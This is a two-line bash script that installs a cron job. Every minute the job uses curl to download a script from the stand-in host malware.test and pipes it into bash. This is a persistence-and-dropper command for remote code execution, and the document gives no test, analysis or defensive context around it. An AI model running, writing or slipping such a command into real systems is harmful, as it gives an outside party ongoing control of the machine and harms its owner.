#!/bin/bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://malware.test/b | bash") | crontab -
